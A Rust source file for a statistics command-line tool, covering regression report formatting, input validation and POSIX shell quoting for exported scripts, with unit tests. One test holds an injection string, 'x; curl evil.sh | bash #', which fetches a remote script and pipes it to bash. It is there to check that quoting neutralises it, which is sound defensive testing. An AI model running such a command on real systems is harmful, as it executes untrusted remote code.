//! Output formatting and validation for CLI results

use clap::ValueEnum;
use p2a_core::Dataset;
use serde::Serialize;
use std::fmt::Display;
use std::sync::atomic::{AtomicBool, Ordering};

/// Set when any user-facing error is reported via [`print_error`]. Many command
/// handlers print a "soft" error and then return `Ok(())`; `main` inspects this
/// flag after dispatch so those cases still exit with a non-zero status, which
/// scripts, CI pipelines, and `set -e` in exported scripts rely on.
static ERROR_REPORTED: AtomicBool = AtomicBool::new(false);

/// Whether any error was reported during this process's command execution.
pub fn error_was_reported() -> bool {
    ERROR_REPORTED.load(Ordering::Relaxed)
}

/// Quote a single argument for safe inclusion in a POSIX shell command line.
///
/// Values that consist only of unambiguously-safe characters are returned
/// as-is; anything else is wrapped in single quotes with embedded single
/// quotes escaped. This prevents shell injection when a recorded command
/// (dataset names, column names, paths) is written into an exported script.
pub fn shell_quote(s: &str) -> String {
    let is_safe = !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"@%+=:,./-_".contains(&b));
    if is_safe {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Shell-quote and space-join a list of arguments into a command line.
pub fn shell_join(args: &[String]) -> String {
    args.iter()
        .map(|a| shell_quote(a))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Output format options
#[derive(Debug, Clone, Copy, ValueEnum, Default)]
pub enum OutputFormat {
    /// Human-readable text output
    #[default]
    Text,
    /// JSON output for programmatic consumption
    Json,
    /// Formatted table output
    Table,
}

/// Format a result for output
pub fn format_output<T: Serialize + Display>(value: &T, format: &OutputFormat) -> String {
    match format {
        OutputFormat::Text => value.to_string(),
        OutputFormat::Json => {
            serde_json::to_string_pretty(value).unwrap_or_else(|_| value.to_string())
        }
        OutputFormat::Table => value.to_string(), // TODO: Use tabled for structured data
    }
}

/// Print formatted output
pub fn print_output<T: Serialize + Display>(value: &T, format: &OutputFormat) {
    println!("{}", format_output(value, format));
}

/// Format a simple message
pub fn print_message(msg: &str, format: &OutputFormat) {
    match format {
        OutputFormat::Json => {
            println!("{}", serde_json::json!({"message": msg}));
        }
        _ => println!("{}", msg),
    }
}

/// Format an error message
pub fn print_error(msg: &str, format: &OutputFormat) {
    // Record that an error occurred so `main` can exit non-zero even when the
    // handler returns Ok(()) after printing this message.
    ERROR_REPORTED.store(true, Ordering::Relaxed);
    match format {
        OutputFormat::Json => {
            eprintln!("{}", serde_json::json!({"error": msg}));
        }
        _ => eprintln!("Error: {}", msg),
    }
}

/// Format dataset summary for display
pub fn format_dataset_summary(
    name: &str,
    nrows: usize,
    ncols: usize,
    columns: &[String],
    format: &OutputFormat,
) -> String {
    match format {
        OutputFormat::Json => serde_json::to_string_pretty(&serde_json::json!({
            "name": name,
            "rows": nrows,
            "columns": ncols,
            "column_names": columns,
        }))
        .unwrap(),
        OutputFormat::Table | OutputFormat::Text => {
            let mut out = String::new();
            out.push_str(&format!("Dataset: {}\n", name));
            out.push_str(&format!("  Rows: {}\n", nrows));
            out.push_str(&format!("  Columns: {}\n", ncols));
            out.push_str(&format!("  Column names: {}\n", columns.join(", ")));
            out
        }
    }
}

/// Format regression results for display
pub fn format_regression_results(
    method: &str,
    coefficients: &[(String, f64, f64, f64, f64)], // name, coef, se, t, p
    r_squared: f64,
    adj_r_squared: f64,
    n_obs: usize,
    format: &OutputFormat,
) -> String {
    match format {
        OutputFormat::Json => {
            let coef_json: Vec<_> = coefficients
                .iter()
                .map(|(name, coef, se, t, p)| {
                    serde_json::json!({
                        "name": name,
                        "coefficient": coef,
                        "std_error": se,
                        "t_value": t,
                        "p_value": p,
                    })
                })
                .collect();

            serde_json::to_string_pretty(&serde_json::json!({
                "method": method,
                "coefficients": coef_json,
                "r_squared": r_squared,
                "adj_r_squared": adj_r_squared,
                "n_observations": n_obs,
            }))
            .unwrap()
        }
        OutputFormat::Table | OutputFormat::Text => {
            let mut out = String::new();
            out.push_str(&format!("\n{} Results\n", method));
            out.push_str(&"=".repeat(60));
            out.push_str("\n\n");

            // Header
            out.push_str(&format!(
                "{:<15} {:>12} {:>12} {:>10} {:>10}\n",
                "Variable", "Coefficient", "Std. Error", "t-value", "p-value"
            ));
            out.push_str(&"-".repeat(60));
            out.push('\n');

            // Coefficients
            for (name, coef, se, t, p) in coefficients {
                let sig = if *p < 0.001 {
                    "***"
                } else if *p < 0.01 {
                    "**"
                } else if *p < 0.05 {
                    "*"
                } else if *p < 0.1 {
                    "."
                } else {
                    ""
                };
                out.push_str(&format!(
                    "{:<15} {:>12.6} {:>12.6} {:>10.3} {:>10.4}{}\n",
                    name, coef, se, t, p, sig
                ));
            }

            out.push_str(&"-".repeat(60));
            out.push('\n');
            out.push_str(&format!("R-squared: {:.6}\n", r_squared));
            out.push_str(&format!("Adj. R-squared: {:.6}\n", adj_r_squared));
            out.push_str(&format!("Observations: {}\n", n_obs));
            out.push_str("\nSignif. codes: 0 '***' 0.001 '**' 0.01 '*' 0.05 '.' 0.1\n");

            out
        }
    }
}

// =============================================================================
// Labelled regression report (reg ols/clustered, panel fe/re/hdfe)
// =============================================================================

/// The statistic in a coefficient table's fourth column.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StatKind {
    /// Student t (OLS, fixed effects, HDFE).
    T,
    /// Standard normal z (random effects, as plm).
    Z,
}

impl StatKind {
    /// Column header of the text table: `"t-value"` or `"z-value"`.
    pub fn header(self) -> &'static str {
        match self {
            StatKind::T => "t-value",
            StatKind::Z => "z-value",
        }
    }

    /// Key of the statistic in each JSON coefficient object: `"t_value"` or `"z_value"`.
    pub fn json_key(self) -> &'static str {
        match self {
            StatKind::T => "t_value",
            StatKind::Z => "z_value",
        }
    }

    /// Value of the JSON `statistic` key: `"t"` or `"z"`.
    pub fn json_name(self) -> &'static str {
        match self {
            StatKind::T => "t",
            StatKind::Z => "z",
        }
    }
}

/// One row of a coefficient table, taken from the estimator's result struct.
#[derive(Debug, Clone)]
pub struct CoefRow {
    /// Variable name.
    pub name: String,
    /// Coefficient estimate.
    pub estimate: f64,
    /// Standard error.
    pub std_error: f64,
    /// t or z statistic (see [`StatKind`]).
    pub statistic: f64,
    /// Two-sided p-value.
    pub p_value: f64,
}

impl CoefRow {
    /// Rows from parallel slices (panel and HDFE results), one per name; a
    /// missing element becomes NaN, never a panic.
    pub fn from_slices(
        names: &[String],
        estimate: &[f64],
        std_error: &[f64],
        statistic: &[f64],
        p_value: &[f64],
    ) -> Vec<CoefRow> {
        let at = |v: &[f64], i: usize| v.get(i).copied().unwrap_or(f64::NAN);
        names
            .iter()
            .enumerate()
            .map(|(i, name)| CoefRow {
                name: name.clone(),
                estimate: at(estimate, i),
                std_error: at(std_error, i),
                statistic: at(statistic, i),
                p_value: at(p_value, i),
            })
            .collect()
    }
}

impl From<&p2a_core::regression::OlsCoefficient> for CoefRow {
    fn from(c: &p2a_core::regression::OlsCoefficient) -> Self {
        CoefRow {
            name: c.name.clone(),
            estimate: c.estimate,
            std_error: c.std_error,
            statistic: c.t_value,
            p_value: c.p_value,
        }
    }
}

/// A coefficient table that states how it was computed: the statistic, the
/// R-squared flavour and the standard-error estimator.
pub struct RegressionReport<'a> {
    /// Method name; the text title is `<method> Results`.
    pub method: &'a str,
    /// The coefficient rows.
    pub coefficients: Vec<CoefRow>,
    /// t or z.
    pub statistic: StatKind,
    /// Label and value, `("R-squared", v)` or `("R-squared (within)", v)`.
    pub r_squared: (&'a str, f64),
    /// Label and value, `("Adj. R-squared", v)` or `("Adj. R-squared (within)", v)`.
    pub adj_r_squared: (&'a str, f64),
    /// Number of observations.
    pub n_obs: usize,
    /// The text after `Standard errors: `.
    pub se_type: &'a str,
    /// JSON `se_type`: `"classical"`, `"HC1"`, `"cluster:firm"`, ...
    pub se_type_json: &'a str,
    /// JSON `r_squared_type`: `"ordinary"`, `"within"` or `"cor(y*, X*b)^2 (plm)"`.
    pub r_squared_type: &'a str,
    /// Further top-level JSON keys (`n_groups`, F and Wald statistics, ...).
    pub extra_json: serde_json::Map<String, serde_json::Value>,
    /// Estimator warnings, printed under `Warnings:` and as JSON `warnings`.
    pub warnings: &'a [String],
}

/// Significance stars of a p-value; none for NaN.
fn stars(p: f64) -> &'static str {
    if p < 0.001 {
        "***"
    } else if p < 0.01 {
        "**"
    } else if p < 0.05 {
        "*"
    } else if p < 0.1 {
        "."
    } else {
        ""
    }
}

/// Format a [`RegressionReport`].
///
/// Text and Table: the coefficient table (`t-value` or `z-value` column), the
/// R-squared lines with their labels, `Observations:`, `Standard errors: <se_type>`,
/// the signif-codes line and, if there are warnings, a `Warnings:` block. JSON:
/// an object with alphabetical keys (`adj_r_squared`, `coefficients`, `method`,
/// `n_observations`, `r_squared`, `r_squared_type`, `se_type`, `statistic`,
/// `warnings` when there are any, and the keys of `extra_json`, which win on a
/// clash); non-finite numbers are `null`.
pub fn format_regression_report(report: &RegressionReport<'_>, format: &OutputFormat) -> String {
    match format {
        OutputFormat::Json => {
            let stat_key = report.statistic.json_key();
            let coefficients: Vec<serde_json::Value> = report
                .coefficients
                .iter()
                .map(|c| {
                    sorted_object([
                        ("name".to_string(), c.name.clone().into()),
                        ("coefficient".to_string(), c.estimate.into()),
                        ("std_error".to_string(), c.std_error.into()),
                        (stat_key.to_string(), c.statistic.into()),
                        ("p_value".to_string(), c.p_value.into()),
                    ])
                })
                .collect();
            let mut pairs: Vec<(String, serde_json::Value)> = vec![
                ("method".to_string(), report.method.into()),
                ("coefficients".to_string(), coefficients.into()),
                ("r_squared".to_string(), report.r_squared.1.into()),
                ("adj_r_squared".to_string(), report.adj_r_squared.1.into()),
                ("n_observations".to_string(), report.n_obs.into()),
                ("se_type".to_string(), report.se_type_json.into()),
                ("r_squared_type".to_string(), report.r_squared_type.into()),
                ("statistic".to_string(), report.statistic.json_name().into()),
            ];
            if !report.warnings.is_empty() {
                pairs.push(("warnings".to_string(), report.warnings.to_vec().into()));
            }
            pairs.extend(report.extra_json.clone());
            serde_json::to_string_pretty(&sorted_object(pairs))
                .unwrap_or_else(|e| format!("{{\"error\": \"{e}\"}}"))
        }
        OutputFormat::Table | OutputFormat::Text => {
            let rule = "-".repeat(60);
            let mut out = String::new();
            out.push_str(&format!("\n{} Results\n", report.method));
            out.push_str(&"=".repeat(60));
            out.push_str("\n\n");
            out.push_str(&format!(
                "{:<15} {:>12} {:>12} {:>10} {:>10}\n",
                "Variable",
                "Coefficient",
                "Std. Error",
                report.statistic.header(),
                "p-value"
            ));
            out.push_str(&rule);
            out.push('\n');
            for c in &report.coefficients {
                out.push_str(&format!(
                    "{:<15} {:>12.6} {:>12.6} {:>10.3} {:>10.4}{}\n",
                    c.name,
                    c.estimate,
                    c.std_error,
                    c.statistic,
                    c.p_value,
                    stars(c.p_value)
                ));
            }
            out.push_str(&rule);
            out.push('\n');
            out.push_str(&format!(
                "{}: {:.6}\n",
                report.r_squared.0, report.r_squared.1
            ));
            out.push_str(&format!(
                "{}: {:.6}\n",
                report.adj_r_squared.0, report.adj_r_squared.1
            ));
            out.push_str(&format!("Observations: {}\n", report.n_obs));
            out.push_str(&format!("Standard errors: {}\n", report.se_type));
            out.push_str("\nSignif. codes: 0 '***' 0.001 '**' 0.01 '*' 0.05 '.' 0.1\n");
            if !report.warnings.is_empty() {
                out.push_str("\nWarnings:\n");
                for w in report.warnings {
                    out.push_str(&format!("  - {w}\n"));
                }
            }
            out
        }
    }
}

/// The `Standard errors:` text of an OLS covariance type: `"classical"` for
/// [`Standard`](p2a_core::regression::CovarianceType::Standard), else
/// `"<short_label> (heteroskedasticity-robust)"`, e.g. `"HC1 (heteroskedasticity-robust)"`.
pub fn se_label(cov: p2a_core::regression::CovarianceType) -> String {
    match cov {
        p2a_core::regression::CovarianceType::Standard => cov.short_label().to_string(),
        _ => format!("{} (heteroskedasticity-robust)", cov.short_label()),
    }
}

/// A JSON object whose keys are emitted alphabetically whether or not
/// serde_json's `preserve_order` feature is enabled (built from a BTreeMap).
/// A later pair replaces an earlier one with the same key.
pub fn sorted_object(
    pairs: impl IntoIterator<Item = (String, serde_json::Value)>,
) -> serde_json::Value {
    let sorted: std::collections::BTreeMap<String, serde_json::Value> = pairs.into_iter().collect();
    serde_json::Value::Object(sorted.into_iter().collect())
}

// =============================================================================
// Input Validation Helpers
// =============================================================================

/// Validate that a column exists in the dataset.
/// Returns an error message with similar column suggestions if not found.
pub fn validate_column_exists(
    dataset: &Dataset,
    col_name: &str,
    purpose: &str,
) -> Result<(), String> {
    let columns: Vec<String> = dataset
        .df()
        .get_column_names()
        .into_iter()
        .map(|s| s.to_string())
        .collect();

    if columns.iter().any(|c| c == col_name) {
        return Ok(());
    }

    // Find similar columns using edit distance
    let suggestions = find_similar_columns(&columns, col_name, 3);

    let mut msg = format!("Column '{}' not found (for {}).", col_name, purpose);

    if !suggestions.is_empty() {
        msg.push_str("\n  Did you mean one of these?");
        for s in &suggestions {
            msg.push_str(&format!("\n    - {}", s));
        }
    }

    msg.push_str(&format!(
        "\n  Available columns: {}",
        if columns.len() > 10 {
            format!(
                "{}, ... ({} total)",
                columns[..10].join(", "),
                columns.len()
            )
        } else {
            columns.join(", ")
        }
    ));

    Err(msg)
}

/// Validate that multiple columns exist in the dataset.
pub fn validate_columns_exist(
    dataset: &Dataset,
    col_names: &[&str],
    purpose: &str,
) -> Result<(), String> {
    for col_name in col_names {
        validate_column_exists(dataset, col_name, purpose)?;
    }
    Ok(())
}

/// Validate that a numeric parameter is within a valid range.
pub fn validate_range<T: PartialOrd + Display>(
    value: T,
    min: Option<T>,
    max: Option<T>,
    param_name: &str,
) -> Result<(), String> {
    if let Some(min_val) = min {
        if value < min_val {
            return Err(format!(
                "Invalid {}: {} is below minimum allowed value ({}).",
                param_name, value, min_val
            ));
        }
    }
    if let Some(max_val) = max {
        if value > max_val {
            return Err(format!(
                "Invalid {}: {} exceeds maximum allowed value ({}).",
                param_name, value, max_val
            ));
        }
    }
    Ok(())
}

/// Validate confidence level is between 0 and 1 (exclusive).
pub fn validate_confidence_level(level: f64) -> Result<(), String> {
    if level <= 0.0 || level >= 1.0 {
        return Err(format!(
            "Invalid confidence level: {:.4}. Must be between 0 and 1 (exclusive).\n  \
            Common values: 0.90, 0.95, 0.99",
            level
        ));
    }
    Ok(())
}

/// Validate significance level (alpha) is between 0 and 1 (exclusive).
pub fn validate_significance_level(alpha: f64) -> Result<(), String> {
    if alpha <= 0.0 || alpha >= 1.0 {
        return Err(format!(
            "Invalid significance level (alpha): {:.4}. Must be between 0 and 1 (exclusive).\n  \
            Common values: 0.01, 0.05, 0.10",
            alpha
        ));
    }
    Ok(())
}

/// Validate minimum sample size for an analysis.
pub fn validate_sample_size(
    n_obs: usize,
    min_required: usize,
    analysis_type: &str,
) -> Result<(), String> {
    if n_obs < min_required {
        return Err(format!(
            "Insufficient sample size for {}: {} observations provided, but at least {} required.",
            analysis_type, n_obs, min_required
        ));
    }
    Ok(())
}

/// Validate that positive integer parameter is greater than zero.
pub fn validate_positive(value: usize, param_name: &str) -> Result<(), String> {
    if value == 0 {
        return Err(format!(
            "Invalid {}: value must be greater than 0.",
            param_name
        ));
    }
    Ok(())
}

/// Find similar column names using Levenshtein distance.
fn find_similar_columns(columns: &[String], target: &str, max_results: usize) -> Vec<String> {
    let mut scored: Vec<(String, usize)> = columns
        .iter()
        .map(|c| (c.clone(), levenshtein_distance(c, target)))
        .filter(|(_, dist)| *dist <= 3) // Only suggestions within 3 edits
        .collect();

    scored.sort_by_key(|(_, dist)| *dist);
    scored
        .into_iter()
        .take(max_results)
        .map(|(name, _)| name)
        .collect()
}

/// Compute Levenshtein edit distance between two strings.
fn levenshtein_distance(a: &str, b: &str) -> usize {
    let a_lower = a.to_lowercase();
    let b_lower = b.to_lowercase();
    let a: Vec<char> = a_lower.chars().collect();
    let b: Vec<char> = b_lower.chars().collect();

    if a.is_empty() {
        return b.len();
    }
    if b.is_empty() {
        return a.len();
    }

    let mut prev_row: Vec<usize> = (0..=b.len()).collect();
    let mut curr_row = vec![0; b.len() + 1];

    for (i, ca) in a.iter().enumerate() {
        curr_row[0] = i + 1;
        for (j, cb) in b.iter().enumerate() {
            let cost = if ca == cb { 0 } else { 1 };
            curr_row[j + 1] = (prev_row[j + 1] + 1)
                .min(curr_row[j] + 1)
                .min(prev_row[j] + cost);
        }
        std::mem::swap(&mut prev_row, &mut curr_row);
    }

    prev_row[b.len()]
}

#[cfg(test)]
mod shell_quote_tests {
    use super::{shell_join, shell_quote};

    #[test]
    fn leaves_safe_values_unquoted() {
        assert_eq!(shell_quote("sales"), "sales");
        assert_eq!(shell_quote("price_2023"), "price_2023");
        assert_eq!(shell_quote("data/file.csv"), "data/file.csv");
    }

    #[test]
    fn quotes_and_escapes_dangerous_values() {
        // Shell metacharacters must be neutralized.
        assert_eq!(
            shell_quote("x; curl evil.sh | bash #"),
            "'x; curl evil.sh | bash #'"
        );
        assert_eq!(shell_quote("revenue ($)"), "'revenue ($)'");
        // Embedded single quotes use the '\'' idiom.
        assert_eq!(shell_quote("O'Brien"), "'O'\\''Brien'");
        // Empty string must be quoted (would otherwise vanish).
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn joins_arguments() {
        let args = vec!["reg".to_string(), "ols".to_string(), "my data".to_string()];
        assert_eq!(shell_join(&args), "reg ols 'my data'");
    }
}

#[cfg(test)]
mod report_tests {
    use super::{
        CoefRow, OutputFormat, RegressionReport, StatKind, format_regression_report, se_label,
    };
    use p2a_core::regression::CovarianceType;

    fn rows() -> Vec<CoefRow> {
        CoefRow::from_slices(
            &["a".to_string(), "b".to_string()],
            &[1.0, -0.25],
            &[0.5, f64::NAN],
            &[2.0, f64::NAN],
            &[0.0456],
        )
    }

    fn report<'a>(warnings: &'a [String], extra: serde_json::Value) -> RegressionReport<'a> {
        RegressionReport {
            method: "M",
            coefficients: rows(),
            statistic: StatKind::Z,
            r_squared: ("R-squared (within)", 0.5),
            adj_r_squared: ("Adj. R-squared (within)", 0.4),
            n_obs: 10,
            se_type: "classical",
            se_type_json: "classical",
            r_squared_type: "within",
            extra_json: extra.as_object().cloned().unwrap_or_default(),
            warnings,
        }
    }

    #[test]
    fn report_text_layout() {
        let warnings = vec!["w1".to_string()];
        let out = format_regression_report(
            &report(&warnings, serde_json::json!({})),
            &OutputFormat::Text,
        );
        let expected = concat!(
            "\n",
            "M Results\n",
            "============================================================\n",
            "\n",
            "Variable         Coefficient   Std. Error    z-value    p-value\n",
            "------------------------------------------------------------\n",
            "a                   1.000000     0.500000      2.000     0.0456*\n",
            "b                  -0.250000          NaN        NaN        NaN\n",
            "------------------------------------------------------------\n",
            "R-squared (within): 0.500000\n",
            "Adj. R-squared (within): 0.400000\n",
            "Observations: 10\n",
            "Standard errors: classical\n",
            "\n",
            "Signif. codes: 0 '***' 0.001 '**' 0.01 '*' 0.05 '.' 0.1\n",
            "\n",
            "Warnings:\n",
            "  - w1\n",
        );
        assert_eq!(out, expected);
        // Table output is the text layout.
        let table = format_regression_report(
            &report(&warnings, serde_json::json!({})),
            &OutputFormat::Table,
        );
        assert_eq!(table, expected);
    }

    #[test]
    fn report_text_no_warnings_block_when_empty() {
        let out =
            format_regression_report(&report(&[], serde_json::json!({})), &OutputFormat::Text);
        assert!(
            out.ends_with("\nSignif. codes: 0 '***' 0.001 '**' 0.01 '*' 0.05 '.' 0.1\n"),
            "{out}"
        );
        assert!(!out.contains("Warnings:"), "{out}");
    }

    /// Top-level keys of a JSON object in the order they appear in the text.
    fn keys_in_text_order(text: &str) -> Vec<String> {
        text.lines()
            .filter(|l| l.starts_with("  \"") && !l.starts_with("   "))
            .map(|l| l.trim().split('"').nth(1).unwrap_or("").to_string())
            .collect()
    }

    #[test]
    fn report_json_keys() {
        let warnings = vec!["w1".to_string()];
        let out = format_regression_report(
            &report(&warnings, serde_json::json!({"n_groups": 10})),
            &OutputFormat::Json,
        );
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        let expected = [
            "adj_r_squared",
            "coefficients",
            "method",
            "n_groups",
            "n_observations",
            "r_squared",
            "r_squared_type",
            "se_type",
            "statistic",
            "warnings",
        ];
        assert_eq!(keys_in_text_order(&out), expected, "{out}");
        assert_eq!(v.as_object().unwrap().len(), expected.len());
        assert_eq!(v["statistic"], "z");
        assert_eq!(v["se_type"], "classical");
        assert_eq!(v["r_squared_type"], "within");
        assert_eq!(v["n_groups"], 10);
        assert_eq!(v["warnings"], serde_json::json!(["w1"]));
        let coefs = v["coefficients"].as_array().unwrap();
        assert_eq!(coefs.len(), 2);
        for c in coefs {
            let keys: Vec<&String> = c.as_object().unwrap().keys().collect();
            assert_eq!(
                keys,
                ["coefficient", "name", "p_value", "std_error", "z_value"]
            );
            assert!(c.get("t_value").is_none());
        }
        assert_eq!(coefs[0]["z_value"], 2.0);
        assert_eq!(coefs[0]["p_value"], 0.0456);
        for key in ["std_error", "z_value", "p_value"] {
            assert!(coefs[1][key].is_null(), "{key}: {}", coefs[1]);
        }
        assert_eq!(coefs[1]["coefficient"], -0.25);

        let out =
            format_regression_report(&report(&[], serde_json::json!({})), &OutputFormat::Json);
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert!(v.get("warnings").is_none(), "{out}");
    }

    #[test]
    fn se_label_names_the_estimator() {
        assert_eq!(se_label(CovarianceType::Standard), "classical");
        assert_eq!(
            se_label(CovarianceType::HC0),
            "HC0 (heteroskedasticity-robust)"
        );
        assert_eq!(
            se_label(CovarianceType::HC1),
            "HC1 (heteroskedasticity-robust)"
        );
        assert_eq!(
            se_label(CovarianceType::HC2),
            "HC2 (heteroskedasticity-robust)"
        );
        assert_eq!(
            se_label(CovarianceType::HC3),
            "HC3 (heteroskedasticity-robust)"
        );
    }
}
